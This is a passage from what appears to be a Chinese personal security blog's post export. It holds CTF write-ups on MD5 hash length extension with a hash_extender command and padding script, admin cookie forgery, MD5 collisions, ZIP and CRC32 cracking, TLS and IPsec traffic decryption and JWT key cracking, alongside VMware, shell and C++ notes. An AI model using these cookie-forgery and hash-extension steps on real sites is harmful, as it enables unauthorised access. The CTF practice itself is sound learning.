使用hashpumpy库可以很方便的计算出扩展后的MD5值，但是不知出了神马问题安装失败。。在网上找到一个脚本，计算出扩展后的MD5值： 在提交数据时，要将填充的16进制数据进行urlencode hash长度扩展其他形式Jarvis OJ中的一道题： 只有管理员才能获得flag，你能想办法获得吗？ 抓包后，发现： 将s%3A5%3A%22guest%22%3B进行url解密，得到s:5:&quot;guest&quot;;，即序列化后的字符串guest 则首先想的是将guest改成Admin，不过没用；注意到了hsh，将其去掉后发包，显示出了错误信息： 进行扫描，发现有/index.php~这个文件，访问后下载下来一个文件，将其改名为.index.php.swp放到linux下恢复，得到源码 代码的意思为，要想得到flag，就要满足： 1.使role的值反序列化后为`admin` 2.使hsh===md5($salt.strrev($_COOKIE[&quot;role&quot;]))其中，strrev()函数的作用为反转(逆序)原字符串，.即为拼接字符串 再看看我们已知的信息： md5($salt+&apos;;&quot;tseug&quot;:5:s&apos;) === 3a4727d57463f122833d9e732f94e4e0 $salt以及它的长度是未知的；那么，要如何构造cookie中的role和hsh的值呢？ 首先，应该确定构造的role：以&#39;s:5:&quot;admin&quot;;&#39;开头，以&#39;s:5:&quot;guest&quot;;&#39;结尾。 因为反序列函数存在00截断，则将&#39;s:5:&quot;admin&quot;;&#39;放开头；逆序后求MD5，因此以&#39;s:5:&quot;guest&quot;;&#39;结尾，这样可以利用已知的md5($salt+&#39;;&quot;tseug&quot;:5:s&#39;)进行扩展 由于不知道$salt长度，因此需要进行爆破。将上面那道题的脚本改了两天没成功。。。。。后来找工具又出现一大堆问题。。。。。后来终于在我的虚拟机上装上了hash_extender!!!服！ 安装过程记录下： 1.安装OpenSSL开发包： apt-get install -y libssl-dev 2.cd到下载的hash_extender目录下，执行make命令输入命令： ./hash_extender --data &#39;;&quot;tseug&quot;:5:s&#39; --signature 3a4727d57463f122833d9e732f94e4e0 --format md5 --append &#39;;&quot;nimda&quot;:5:s&#39; --secret-min 1 --secret-max 43 跑出来是这样的： 虽然得到的MD5值都一样，但填充的不一样…不知道怎么回事 写了个脚本，写完才发现这个方法没什么用…因为我看wp，知道salt长度为12，然后选取相应的填充用脚本跑…如果要是比赛，那就得一个个试了……. 12345678910111213141516171819202122new_list = input('Input: ')n = 2 #平均分成n个new_list = [new_list[i:i + n] for i in range(0, len(new_list), n)]fin_0 = new_list[:12]fin_1 = new_list[12:-12]fin_2 = new_list[-12:]fin_0.reverse()fin_1.reverse()fin_2.reverse()s = ''for i in fin_2: # admin在前 s = s + chr(int(i, 16))for i in fin_1: # 填充 i = '%' + i s = s + ifor i in fin_0: # guest在后 s = s + chr(int(i, 16)) print(s) 又累个半死也没有安装好hashpumpy…以后虚拟机多了再弄，心累. 参考文章： https://www.freebuf.com/articles/web/69264.htmlhttps://www.jianshu.com/p/17e6dcf2c79chttps://err0rzz.github.io/2017/09/18/hash长度扩展攻击]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[流量分析-SSL/TLS与FTP学习]]></title>
    <url>%2F2019%2F03%2F18%2F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-SSL-TLS%E3%80%81FTP%E3%80%81SMTP%E3%80%81HTTP%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[前些天在公众号看到一篇有关流量分析的文章，写的挺详细的，由于之前学习计网并没有详细的了解这些协议的内容，自己也缺乏流量分析的经验，便顺着作者的思路学习一下文章链接： https://mp.weixin.qq.com/s/Uy48omcNlpTlTHhLq64FbA 分析前，先搞清楚公钥、私钥、数字签名以及运输层和应用层的一些协议 对称秘钥体制与公钥密码体制1.对称密码体制，即加密秘钥与解密秘钥相同的密码体制；在通信信道上可以进行一对一的双向保密通信，每一方既可以用此秘钥加密密文，发送给对方，也可以接受密文，并用同一秘钥对密文解密；这种保密通信仅限于持有此秘钥的双方 2.在对称秘钥体制中，如何才能给加解密的双方分配秘钥呢？如果使用高度安全的秘钥分配中心KDC，会使得网络成本增加；于是提出了公钥密码体制 3.在公钥密码体制中，加密秘钥PK是向公众公开的，而解密秘钥SK(私钥或秘钥)则是需要保密的；加密算法和解密算法也都是公开的 在公钥密码体制中，在通信信道上可以是多对一的单向保密通信 例如，在网购时，许多客户端都向同一网站发送自己的账号密码等信息： 数字签名签名在我们生活中很常见，比如盖章、在合同上签字；那么计算机网络中传送的数据如何签名呢？就要使用数字签名 数字签名必须保证能够实现以下功能： 报文鉴别，接收者能够核实发送者对报文的签名，即接收者能够确信该报文的确是发送者发送的，其他人无法伪造对报文的签名 报文的完整性，接收者确信所收到的数据和发送者发送的完全一样，没有被篡改过 不可否认，发送者事后不能抵赖对报文的签名 数字签名流程： 为了进行签名，A用其私钥对报文进行D运算(这里D运算不是解密运算，只是得到了某种不可读的密文)，A把经D运算得到的密文传送给B，B为了核实签名，用A的公钥进行E运算，还原出明文； 数字签名的三项功能的关键在于，没有其他人能够持有A的私钥 上述过程仅对报文进行了签名，如果还要对报文进行加密，可以用下图表示： HTTP/HTTPSHTTP，超文本传输协议，被用在浏览器与服务器之间传递明文信息；如果攻击者截取了传输的报文，则可以直接读懂其中的信息，因此HTTP协议不适用于传输密码或者其他敏感信息；使用TCP的80端口 为了解决HTTP的缺陷，需要使用另一种协议HTTPS HTTPS，超文本传输安全协议，在HTTP下加入SSL层；使用TCP的443端口 SSL/TSLSSL，Secure Socket Layer，即安全套接字层。SSL作用在运输层与应用层的HTTP之间，在TCP之上建立一个安全通道，为通过TCP传输的应用层数据提供安全保障 TSL，Transport Layer Security，即运输层安全。TSL协议是在SSL 3.0的基础上设计的，为所有基于TCP的网络应用提供安全数据传输服务 SSL/TSL并非仅用于HTTP，而是可用于任何应用层协议 SSL/TSL提供的安全服务可归纳为以下三种： SSL/TSL服务器鉴别，允许用户证实服务器的身份。支持SSL的客户端通过验证来自服务器的证书，来鉴别服务器的真实身份并获得服务器的公钥 SSL/TSL客户鉴别，SSL/TSL的可选安全服务，允许服务器证实客户的身份 加密的SSL/TSL会话，对客户和服务器间发送的所有报文进行加密，并检测报文是否被篡改 FTPFTP，File Transfer Protocol，即文件传输协议，是用于在网络上进行文件传输的一套协议标准 默认情况下FTP使用TCP的20和21端口； 21 ： 建立连接 20 ： 传输数据 SMTPSMTP，Simple Mail Transfer Protocol，即简单邮件传输协议；使用TCP的25端口 流量分析题目描述： 一家安全公司开发的人工智能系统已经叛变，为防止机械大战。我们要找到叛变AI的计划， 所幸我们在敌人后方安插了间谍，他已经捕获了敌人的通信报文，你所需的所有内容应该 都能从中找到。答案格式INS{xxx}用wireshark打开流量包后，首先点开统计中的协议分级 可以看到数据包使用的协议，SMTP、SSL、HTTP、FTP Data以及FTP 先看一下SMTP，过滤一下，再进行流追踪，发现一段英文： 注意到这个网址https://ssc.teaser.insomnihack.ch 再用FTP，进行流追踪，来看下FTP中有什么信息： 发现有用户名、密码、端口号、以及一个文件名；而且发现端口号是21；则查看20端口号： 输入tcp.port==20进行过滤，发现一串秘钥： 将这串秘钥保存下来，命名为ssc.key；利用上面的信息，就可以将SSL加密的数据包进行解密了]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[VMware学习]]></title>
    <url>%2F2019%2F03%2F16%2FVMware%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近打算系统学习一下VMware，在此记录 环境：安装了WMware Workstation及虚拟机Windows Server2008 虚拟机基本配置 VMware Tools这个工具可以让虚拟机窗口适应WMware Workstation，还可以与物理机同步时间、共享文件等 虚拟机与物理机文件相互访问首先需要安装VMware Tools 方法一：直接复制粘贴此方法适用于小文件；如果是大文件的话，复制到虚拟机中会使vmdk文件(虚拟硬盘)增大，即同时增大了对物理机内存的占用 方法二：设置共享文件夹文字描述：在VMware Workstation中点击设置，找到选项中的共享文件夹，点击总是启用,并勾选在Windows客户机中映射为网络驱动器，之后点击添加，选择需要共享的文件夹，再点确定，即可在虚拟机找到Shared Folders网络驱动器，打开即可找到物理机的文件 图片描述： 物理机桌面上有一个文件夹书籍 打开虚拟机的设置，找到选项中的共享文件夹，按图所示勾选，选择需要共享的文件夹，点击确定： 之后即可在虚拟机的磁盘中找到该文件夹： 虚拟机使用物理机USB接口设备首先，在虚拟机的设置里面要有USB控制器，如果没有可以添加 以U盘为例： 在物理机上插入U盘，找到虚拟机，选择可移动设备，找到USB Mass Storage Device，选择连接 选择过后的图： 此时U盘断开了与物理机的连接，连接上了虚拟机 若失败了，则可以看看虚拟机的服务中是否开启了相应的服务 虚拟机截图找到虚拟机，点击捕获屏幕即可将虚拟机当前截图保存到物理机桌面上 快捷键为：Ctrl+Alt+PrintScreen 快照快照功能可以保存及还原虚拟机的状态；快照的功能如同存档，可以存也可以读取 如，现在虚拟机是宅男滴桌面~ 在虚拟机选项中找到快照，点击快照管理器 名称设为宅男的桌面~，拍摄快照 之后将桌面上的图片都删了，切换为“学霸模式”，并拍摄快照 现在想切换为宅男怎么办呢？打开快照管理器，找到宅男的桌面，然后点击转到 就恢复如初啦！ 虚拟机网络设置两台虚拟机相互通信VMNet相当于一个交换机，虚拟机必须在同一个VMNet中才能直接相互通讯 可以在虚拟网络编辑器中规划子网ip，可以设置成有规律的子网ip，比较容易管理和记忆 例如： 环境：虚拟机Windows Server2008和虚拟机Red Hat Enterprise Linux 在设置-网络适配器中选择网络连接，这里两个虚拟机都选择VMnet2： 在编辑-虚拟网络编辑器中进行编辑，添加网络VMnet2；之后将VMnet1、VMnet2、VMnet8的网卡均重新设置子网ip： VMnet1：192.168.10.0 VMnet2：192.168.20.0 VMnet8：192.168.80.0 可以点击DHCP设置，查看DHCP的配置： 若自动分配ip则会获得上面范围内的ip地址 在Windows Server2008中打开本地网络-属性，选择ipv4-自动获得ip地址： 则会发现获得的ip地址在DHCP配置的范围内： 同理，在Red Hat Enterprise Linux中查看获得的ip： 发现这两台虚拟机在同一网段，且ip地址不冲突 测试两台虚拟机通信情况：用Red Hat Enterprise Linux ping Windows Server2008，发现ping不通；而反过来能ping通 则将Windows Server2008中的防火墙关闭，再次测试，发现双方都能ping通 物理机上的虚拟网卡两台虚拟机连接上了同一个VMnet网络，才能相互通信，那么虚拟机要与主机进行通信呢？ 如果要与主机通信，那么就要在物理机上添加虚拟网卡，将网卡加入到VMnet网络中， 可以用图表示为： 此时，虚拟机只能访问添加的网卡的ip地址，不能访问物理机本身的ip 经过上面的配置，现在物理机有了三块虚拟网卡：VMnet1、VMnet2、VMnet8(可以按F2将网卡改名) 这些网卡就是添加到VMnet1、VMnet2、VMnet8中的网卡 点击查看属性，可以看到ip地址均为刚才指定的子网的ip地址(均自动获得) 现在，测试虚拟机与物理机的连通性： 小结：在虚拟机添加网络的时候，会自动添加虚拟网卡连接到相应的VMnet中去 取消主机连接到虚拟网络的网卡如果只需要两台虚拟机相互通信，不需要虚拟机与物理机的通信，则可以取消主机上的连接到VMnet中的虚拟网卡 打开虚拟网络编辑器，选择VMnet2，取消勾选将主机虚拟适配器连接到此网络，点击应用 发现连接到VMnet2的网卡不见了 此时进行连通性测试，发现两台虚拟机仍能通信，但虚拟机与物理机不能通信了 NAT模式NAT即网络地址转换，通过NAT模式可以使虚拟机访问外网 在物理机的服务中，可以找到VMware NAT Service，这个服务在安装VMware的时候会添加，相当于把物理机当成路由器来实现网络地址转换 可以在虚拟网络编辑器中找到NAT配置： 在设置中切换网络为VMnet8，此时物理机相当于路由器： 这样就能够在虚拟机中上网了 NAT模式端口映射此方法可以让同一局域网下的物理主机访问虚拟机中提供的端口服务 在虚拟网络编辑器中找到NAT设置，设置主机端口，填写类型以及虚拟机的ip地址和提供的端口服务；之后可以让同一局域网中的其他物理主机访问自己物理机ip+主机端口号，即可映射到虚拟机的ip+端口 例如，我的物理机ip地址为10.133.15.206，虚拟机使用NAT获得的ip地址为192.168.80.131，现在想要同一局域网上的其他主机访问我的虚拟机中的HTTP服务，那么配置的端口映射为： 之后，其他主机只需访问10.133.15.206:8888，即可访问到我的虚拟机服务器对外开放的HTTP服务]]></content>
      <categories>
        <category>WMware</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Shell编程]]></title>
    <url>%2F2019%2F03%2F15%2FShell%E7%BC%96%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[bash是大多数linux系统默认的shell；一般的shell脚本后缀名为.sh 注释符注释符以#开始，到该行结束 执行脚本 方法1: ./file 方法2: bash file 使用方法1时，需要添加脚本文件的执行权限： chmod +x file使用方法2时，原理是将脚本文件作为参数传给shell命令；一般在脚本的第一行指定用哪个程序来编译和执行脚本： #!bin/bash #!bin/sh #!bin/csh如，在文件test.sh中第一行添加#!bin/bash，则执行时输入命令： bash test.sh即可 shell程序的位置参数由系统提供的参数为位置参数 $0 : shell脚本的名字 $1-9 : 命令行参数1-9的值 $* : 命令行中所有的参数 $@ : 命令行中所有的参数 $# : 命令行参数的总个数 例如，创建了一个文件cmds.sh，在里面写入： #!bin/bash echo program name is $0 echo there are totally $# parameters passed to this program echo the parameters are $*则在命令行的输入输出： user@user-PC:~/Desktop$ bash cmds.sh 1 2 3 4 program name is cmds.sh there are totally 4 parameters passed to this program the parameters are 1 2 3 4那么如果要获取命令行参数第10个及其以后的参数呢？由于没有$10这种写法，可以使用shift命令来实现 shift [N] : 把命令行参数向左移动N个位置例如，现在输入10个数，要把第10个数输出，可以这样写： #!bin/bash echo the parameters are $* shift echo the tenth parameter is $9则运行时的输出输出为： user@user-PC:~/Desktop$ bash cmds.sh 1 2 3 4 5 6 7 8 9 18 the parameters are 1 2 3 4 5 6 7 8 9 18 the tenth parameter is 18变量变量的声明bash变量不一定要声明，但有些特殊类型的变量必须要声明 declare [options] [name=value]常用options: -a : 声明name为数组 -f : 声明name为函数 -i : 声明name为整数 -r : 声明name是只读的变量 -x : 表明name为全局变量 变量的赋值name=value=前后没有空格，如果一个值包含空格，则必须将其包括在括号中 例如： user@user-PC:~/Desktop$ d=hello world bash: world: 未找到命令 user@user-PC:~/Desktop$ d=(hello world) user@user-PC:~/Desktop$ echo $d hello变量的引用可以在变量前加上$符引用变量 引号和反斜线的使用单引号：不允许有变量替换 双引号：允许使用$符进行变量替换 反斜线\：除去字符的特殊含义，按表面意思处理 命令替换一个命令被包括在一对括号里并在括号前加上$，或者被包括在反引号``里的时候，shell把它替换为这个命令的输出结果 例如 command=$(ls) #或者command=`ls` user@userf-PC:~/Desktop$ echo $command cmds.sh test test.sh 新建文本.sh 新建文件夹控制结构语句顺序结构语句按语句从上往下依次执行 条件语句if expression then ...... elif expression then ...... else ...... fi其中，expression为表达式]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[C++头文件与命名空间问题]]></title>
    <url>%2F2019%2F03%2F12%2FC-%E5%A4%B4%E6%96%87%E4%BB%B6%E4%B8%8E%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[今天上windows网络编程遇到一些C++很基础的问题 碰到下面这种情况： 123456#include &lt;iostream&gt;using namespace std;int main()&#123; ...&#125; 还有另一种情况 123456#include &lt;iostream&gt;int main()&#123; using namespace std; ...&#125; 那么using namespace std;到底放在哪呢？弄懂这个问题之前，先明白这句话的由来： C语言的使用的头文件是#include &lt;iostream.h&gt;，而C++使用的的头文件是#include &lt;iostream&gt;。早些的编码将标准库功能定义在全局空间里，声明在.h后缀的头文件中；C++为了和C区分开，也为了正确使用命名空间，规定头文件不使用.h后缀 当使用#include &lt;iostream&gt;时，未定义命名空间，因此需要使用namespace using namespace std意思是使用标准库；using和namespace都是C++关键词，C++标准程序库中的所有标识符都被定义在一个名为std的namespace中 回到这个问题上，第一种是在整个文件中都引入了std命名空间，第二种只在main函数中引入std命名空间]]></content>
      <categories>
        <category>C++</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[流量分析-网络层安全协议(IPsec)]]></title>
    <url>%2F2019%2F03%2F11%2F%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE-IPsec%2F</url>
    <content type="text"><![CDATA[在VPN中传送的信息都是经过加密的，提供这种加密服务的就是IPsec IPsec协议族IPsec是能够在IP层提供互联网通信安全的协议族；实际上，IPsec是个框架，它允许通信双方选择合适的算法和参数 IPsec协议族中的协议可分为以下三部分： IP安全数据包格式的两个协议：鉴别首部AH协议和封装安全有效载荷ESP协议 有关加密算法的三个协议 互联网秘钥交换IKE AH协议提供源点鉴别和数据报完整性，但不能保密；ESP协议提供源点鉴别、数据完整性和保密。AH协议的功能都已包含在ESP协议中，因此使用ESP协议就可不使用AH协议 使用ESP或AH协议的IP数据报称为IP安全数据报，它可以在两台主机之间、两个路由器之间或一台主机一台路由器之间发送;所谓安全数据报是指数据报的数据部分是经过加密的，并能够被鉴别的 安全关联SA在发送IP安全数据报之前，在源实体和目的实体之间必须创建一条网络层的逻辑连接，即安全关联SA。安全关联是从源点到终点的单向连接，它能够提供安全服务；如需进行双向安全通行，则两个方向都要建立安全关联 建立安全关联SA的路由器或主机，必须这条维护SA的状态信息，其状态信息应包括： 安全参数索引SPI 安全关联的SA的源点和终点的IP地址 所使用的加密类型 加密的秘钥 完整性检查的类型 鉴别使用的秘钥 流量分析安恒二月月赛流量分析 在过滤器中输入http 发现了robots.txt文件，进行http流追踪 发现最后一行Disallow，搜索含有abc.html的数据包 进行http流追踪 发现有一个md5数据，两个DES数据，则先将这三行数据保存下来，接着分析 发现有一些使用ESP协议的数据，即IP安全数据报，则刚好可以用刚才获取的秘钥解密 选中-右键-协议首选项-Open Encapsulating Security Payload preference(打开封装安全有效负载首选项) 找到ESP，将后两个选项勾选上，然后点Edit 填写相关信息，点击确定 之后查看解密出来的信息 推测文件名为ascii码，写脚本跑出flag 123info = [102, 108, 97, 103, 123, 50, 55, 98, 48, 51, 98, 55, 53, 56, 102, 50, 53, 53, 50, 55, 54, 101, 53, 97, 57, 56, 100, 97, 48, 101, 49, 57, 52, 55, 98, 101, 100, 125]for i in info: print(chr(i),end='')]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[CTF-ZIP加密文件破解]]></title>
    <url>%2F2019%2F03%2F10%2FCTF-ZIP%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[参考大佬文章： https://www.cnblogs.com/leixiao-/p/9824557.html 明文攻击http://www.gtfly.top/2019/02/01/ZIP明文攻击/ 伪加密http://www.gtfly.top/2019/02/02/Bugku-ZIP伪加密/ CRC32碰撞计网学过CRC，循环冗余检验，检验数据是否发生了改变 CRC32表示产生一个32bit的校验值 碰撞原理：每个文件都有唯一的CRC32值，若知道一段数据的长度和CRC32值，便可穷举数据，与其CRC32对照，以达到暴力破解的目的，通常适用于较小的文件 工具：https://github.com/theonlypwner/crc32]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[安恒杯二月月赛wp]]></title>
    <url>%2F2019%2F03%2F08%2F%E5%AE%89%E6%81%92%E6%9D%AF%E4%BA%8C%E6%9C%88%E6%9C%88%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[来玩个游戏吧下载下来有两个文件，一个题目说明.txt，一个是game.exe 题目说明.txt: 学信息安全的朋友给你发来一封邮件，是一个小程序，有两个关卡，只要你通过这两个关卡，就会收到一封邮件。 但是这封邮件对于一般人的话会当做垃圾邮件处理，但是你知道，朋友所要描述的信息就在这封垃圾邮件当中。 邮件内容是普通的信息，但是你知道绝密消息（flag）就隐藏在其中，需要一个在线的网站去解密，而这个网站使用了栅格密码。game.exe: 发现第一关的字符串是盲文，不过感觉显示的有点乱，而且也不知道怎样用键盘打出盲文。。就搜了一个可以复制程序文本的工具Textify 复制后用盲文在线解密网站解密： 得到字符串： ??41402abc4b2a76b9719d911017c592卡到这了，这是神马加密？(看了大佬的wp才发现，我连搜都不会) 由于开头两位是问号，则搜索后面的字符串，发现是hello的md5加密 第二关需要输入两个有着相同md5值的文件，这里用到了一个生成工具fastcoll_v1.0.0.5 在工具目录新建一个a.txt，cd到工具目录 fastcoll_v1.0.0.5.exe -p a.txt -o a1.txt a2.txt之后将这两个文件路径填上去第二关就过了，邮件接收区会显示一堆感觉是乱写的英文： 由于题目说明中提示栅格密码，搜索一下发现了使用栅格密码的网站 http://www.spammimic.com解码即可 真是想半天还不如搜索一下 密码本这题太考脑洞了。。 下载下来有两个文件，一个为题目描述.txt，一个为cipher.txt 题目描述.txt: 这个密码本本该只使用一次的，但是却使用了多次，导致密文易被破解 经过一番尝试发现，秘钥的首字母很可能是y，剩下的就靠你了cipher.txt: cip1: rlojsfklecby cip2: ulakqfgfsjlu cip3: dpaxwxtjgtay了解了一些维吉尼亚加密(多表代换密码)： 设密钥K=(k1,k2,…,kd)，明文M=(m1,m2,…,mn)，密文C=(c1,c2,…,cn)； 加密变换为：ci=Eki(mi)=mi+ki(mod 26) 解密变换为：mi=Dki(ci)=ci-ki(mod 26) 写python脚本： 123456789101112131415161718192021while 1: key = input() # 秘钥 # 密文 c1 = 'rlojsfklecby' c2 = 'ulakqfgfsjlu' c3 = 'dpaxwxtjgtay' # 明文 res1 = '' res2 = '' res3 = '' for i in range(0,len(key)): res1 += chr((ord(c1[i]) - ord(key[i])) % 26 + 97) res2 += chr((ord(c2[i]) - ord(key[i])) % 26 + 97) res3 += chr((ord(c3[i]) - ord(key[i])) % 26 + 97) print(res1) print(res2) print(res3) 由于提示秘钥首位是y尝试后发现输出为 t w f根据最后一个明文首字母为f，则猜测最后一个明文的第二个字母为l、第三个为a、第四个为g 得到其对应的秘钥为year，尝试后输出： thos what flag根据第一个解出的明文，猜测下一位明文为e，其对应的秘钥为o 输入yearo，输出： those whatc flagi根据最后一个明文，猜测下一位字母为s，其对应的秘钥为f 输入yearof，输出： thosea whatca flagis根据第二个明文，猜测下一位为n，其对应秘钥为t 输入yearoft，输出： thosear whatcan flagisa此时猜测秘钥后面为he，即yearofthe，输出为： thosearea whatcanyo flagisacc根据第二个明文，下一位应该为u，对应秘钥为p，输入yearofthep，输出： thosearean whatcanyou flagisacce根据第三个明文可推断出剩下的两位为ss，对应秘钥为ig，输入yearofthepig，输出： thoseareants whatcanyoudo flagisaccess太强了这猜想能力，膜拜大佬 https://www.anquanke.com/post/id/171543 膜拜出题人，解密过程中这三个字符串真是相辅相成，nb hahaha 根据文件大小，推断出可以使用CRC32爆破： 得到： tanny_is_very_beautifu1_解压得到flag.pdf: 也就是说可选的字符有： !@12e[]{}asfghlcn根据flag格式，可以排除一些： 格式：flag{} 可选：!@12eshcn之后想用写脚本的方法爆破出来，不过写不出来脚本。。。字符串怎样进行排列组合呢？ 参考大佬的文章https://blog.csdn.net/neweastsun/article/details/51965226，了解到了python内置模块itertools的使用： 1234567891011121314151617# itertools提供了非常有用的用于操作迭代对象的函数import itertools# permutations(p, r);返回p中任意取r个元素做排列的元组的迭代器for i in itertools.permutations([1,2,3], 3): print(i)'''输出:(1, 2, 3)(1, 3, 2)(2, 1, 3)(2, 3, 1)(3, 1, 2)(3, 2, 1)''' 不确定是按了12还是!@、1@或!2，反正就是4选2，写了个脚本： 12345678910111213141516171819import hashlibimport itertoolsstr1 = '1!'str2 = '2@'#str3 = 'eshcn' + str1[0] + str2[0]str3 = 'eshcn' + str1[0] + str2[1]#str3 = 'eshcn' + str1[1] + str2[0]#str3 = 'eshcn' + str1[1] + str2[1]for i in itertools.permutations(str3, len(str3)): sorted_str3 = ''.join(i) flag = 'flag&#123;' + sorted_str3 + '&#125;' if hashlib.sha1(flag.encode('utf-8')).hexdigest() == 'e6079c5ce56e781a50f4bf853cdb5302e0d8f054': print(flag) breakprint('over') 得到flag 非常简单的流量分析http://www.gtfly.top/2019/03/11/流量分析-网络层安全协议-IPsec/#more]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-做个游戏(08067CTF)]]></title>
    <url>%2F2019%2F03%2F06%2FBugku-%E5%81%9A%E4%B8%AA%E6%B8%B8%E6%88%8F-08067CTF%2F</url>
    <content type="text"><![CDATA[了解到了使用java的反编译工具jad:可以把java的class文件反编译成源代码(jad文件) 使用foremost分离这个游戏后，发现有三个文件夹 cn、images、META-INF在cn里面的文件都是class文件，则使用jad进行反编译(linux的不会装。。。还是用windows的) cd到cn目录，执行 jad -d result plane/*.class在result文件中看到了反编译后的jad文件，打开查看，最后在PlaneGameFrame.jad这个文件中找到了flag，当然用linux的grep直接搜更快]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Bugku-账号被盗了]]></title>
    <url>%2F2019%2F03%2F06%2FBugku-%E8%B4%A6%E5%8F%B7%E8%A2%AB%E7%9B%97%E4%BA%86%2F</url>
    <content type="text"><![CDATA[进去后提示：You are not an admin! 查看cookie发现: isadmin=false则修改为true；刚好今天在书上看到可以在浏览器consle中修改cookie： 如果使用document.cookie设置重复的key，那么浏览器会替换原来的key值就设置： document.cookie=&quot;isadmin=true&quot;之后刷新页面即可看到一个链接 http://120.24.86.145:9001/123.exe访问链接，下载下来一个CF刷枪精灵。。 做的时候没一点思路，找了wp才明白需要抓包流量分析，涨姿势了 由于连的wifi，则使用WLAN接口 在刷枪精灵中随便填选之后开始捕获流量，再点击确认提交，之后找了几个TCP进行追踪TCP流 在这里发现有两条使用base64编码的字符串，进行解码后是一个163的账号和密码，登录后找到flag 啊哈哈~]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JWT]]></title>
    <url>%2F2019%2F03%2F02%2FJWT%2F</url>
    <content type="text"><![CDATA[JWT，Json Web Token，是一种基于token的json格式web认证的方法 在学习JWT前，先学习一些Token的知识 Session与Token最开始，http是无状态的，服务器无法辨别http请求是否来自同一客户端； 之后，在交互式web应用中，服务器使用Session来辨别用户：初次向服务器请求时服务器会发送回来一个session id，之后客户端向服务器请求时带上这个字符串，服务器就能区分开了 但这种方法对服务器带来了很大的开销：每个客户只需要存储自己的session id，而服务器要保存所有客户的session id 那么，如何让每个客户端去保存这种session，服务器不去保存呢？关键就是验证 Token验证流程： 点击登录时，服务器验证成功后会发送给用户一个token 客户端存储Token(cookie或其他存储)，再次请求时会带着token 服务端收到请求，去验证token，如果验证成功则返回请求的数据 那么如何防止其他人去伪造Token呢？下面我们来了解一下JWT JWT结构： Header(头信息) Payload(消息体) Signature(签名) jwt即为： urlsafe_b64encode(Header).urlsafe_b64encode(Payload).base64urlEncode(Signature)则jwt看起来类似： eyJhbGciIkpXVCJ9.eyJzdWIiOiIxwibdWV9.TJVA95OrM7E2cBab30RMHrHDcEf这里解释一下什么是urlsafe_b64encode： base64转码时会生成“+”，“/”，“=”这些被URL进行转码的特殊字符,如果希望在url中传输这些编码字符串，则要在base64编码基础上做一些处理 base64urlsafe编码的流程： 明文使用BASE64进行加密 在BASE64的基础上进行替换： 把”+”替换成”-“ 把”/“替换成”_” 长度不为四的倍数，补”=” Header(头信息)指定了该JWT使用的签名算法 { &apos;typ&apos;: &apos;JWT&apos;, &apos;alg&apos;: &apos;HS256&apos; }HS256 表示使用了 HMAC-SHA256 来生成签名 Payload(消息体)是token的具体内容；里面的内容可以是标准字段，还可自定义添加其他内容 标准字段： iss:jwt的签发者 sub:jwt所面向的用户 aud:接收方 exp:过期时间；需大于签发时间 nbf:定义在什么时间之前，该jwt都是不可用的 iat:jwt的签发时间 jti：JWT IDSignature(签名) 分别用baseUrlEncode()编码Header和Payload，用小数点’.’将编码后的两部分连接起来 使用Header中声明的加密方式进行加盐(key)组合加密；key保存在服务器端 签名的目的： 签名实际上是对Header和Payload的内容进行签名；如果有人对Header以及Payload的内容解码之后进行修改，再进行编码的话，那么新的Header和Payload的签名和之前的签名就将是不一样的。而且，如果不知道服务器加密的时候用的密钥的话，得出来的签名也一定会是不一样的。 秘钥(key)一旦泄露，客户端即可自我签发jwt python3中的JWT模块源地址： https://github.com/jpadilla/pyjwt/首先安装模块： pip install PyJWT导入： import jwt生成jwt： encoded = jwt.encode({&apos;some&apos;: &apos;payload&apos;}, &apos;secret&apos;, algorithm=&apos;HS256&apos;)解析jwt： decoded = jwt.decode(encoded, &apos;secret&apos;, algorithms=[&apos;HS256&apos;])如果不知道秘钥的话，可以使用python的base64模块来进行编码和解码jwt的Header与Payload部分： import base64 encode_str = base64.urlsafe_b64encode(b&apos;abcd&apos;).decode(&apos;utf-8&apos;) decode_str = base64.urlsafe_b64decode(&apos;YWJjZA==&apos;).decode(&apos;utf-8&apos;) print(&apos;经base64urlsafe编码后的结果为： &apos;, encode_str) print(&apos;经base64urlsafe解码后的结果为： &apos;, decode_str)JWT安全可以使用暴力破解的办法对key进行破解，以验证网站token的安全性。比如这个工具： https://github.com/brendan-rius/c-jwt-cracker除了用python或其他语言的模块，下面这个网站也可以解析出token的header和payload；还可进行token的生成： https://jwt.io/参考： https://www.jianshu.com/p/af8360b83a9f https://www.jianshu.com/p/576dbf44b2ae https://www.helplib.com/GitHub/article_149904 https://www.cnblogs.com/moyand/p/9047978.html https://www.cnblogs.com/kidsitcn/p/6901431.html]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python数据可视化-pyecharts的使用]]></title>
    <url>%2F2019%2F02%2F27%2Fpython%E6%95%B0%E6%8D%AE%E5%8F%AF%E8%A7%86%E5%8C%96-pyecharts%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
